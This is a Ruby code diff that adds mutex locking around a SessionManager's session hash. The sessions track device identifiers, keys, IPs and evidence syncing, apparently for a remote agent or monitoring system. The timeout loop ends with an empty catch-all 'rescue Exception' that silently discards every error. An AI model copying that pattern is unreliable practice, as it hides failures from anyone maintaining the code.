@@ -18,6 +18,7 @@ class SessionManager
   include RCS::Tracer
 
   def initialize
+    @semaphore = Mutex.new
     @sessions = {}
   end
 
@@ -32,16 +33,18 @@ class SessionManager
     cookie = cookie.slice(0..25) if subtype == 'SYMBIAN'
 
     # store the sessions
-    @sessions[cookie] = {:bid => bid,
-                         :ident => ident,
-                         :instance => instance,
-                         :subtype => subtype,
-                         :key => k,
-                         :cookie => cookie,
-                         :ip => ip,
-                         :time => Time.now,
-                         :count => 0,
-                         :total => 0}
+    @semaphore.synchronize do
+      @sessions[cookie] = {:bid => bid,
+                           :ident => ident,
+                           :instance => instance,
+                           :subtype => subtype,
+                           :key => k,
+                           :cookie => cookie,
+                           :ip => ip,
+                           :time => Time.now,
+                           :count => 0,
+                           :total => 0}
+    end
 
     return cookie
   end
@@ -65,8 +68,10 @@ class SessionManager
     return false if @sessions[cookie].nil?
 
     # update the time of the session (to avoid timeout)
-    @sessions[cookie][:time] = Time.now
-
+    @semaphore.synchronize do
+      @sessions[cookie][:time] = Time.now
+    end
+    
     return true
   end
 
@@ -75,7 +80,9 @@ class SessionManager
   end
 
   def delete(cookie)
-    @sessions.delete(cookie)
+    @semaphore.synchronize do
+      @sessions.delete(cookie)
+    end
   end
 
   # default timeout is 2 hours
@@ -87,16 +94,22 @@ class SessionManager
     # save the size of the hash before deletion
     size = @sessions.length
     # search for timed out sessions
-    @sessions.each_pair do |key, sess|
-      if Time.now - sess[:time] >= delta then
-        trace :info, "Session Timeout for [#{sess[:cookie]}]"
-        
-        # update the status accordingly
-        DB.instance.sync_timeout sess
-        EvidenceManager.instance.sync_timeout sess
+    @semaphore.synchronize do
+      begin
+        @sessions.each_pair do |key, sess|
+          if Time.now - sess[:time] >= delta then
+            trace :info, "Session Timeout for [#{sess[:cookie]}]"
 
-        # delete the entry
-        @sessions.delete key
+            # update the status accordingly
+            DB.instance.sync_timeout sess
+            EvidenceManager.instance.sync_timeout sess
+
+            # delete the entry
+            @sessions.delete key
+          end
+        end
+      rescue Exception => e
+        # catch all to avoid semaphore problems
       end
     end
     trace :info, "Session Manager timed out #{size - @sessions.length} sessions" if size - @sessions.length > 0
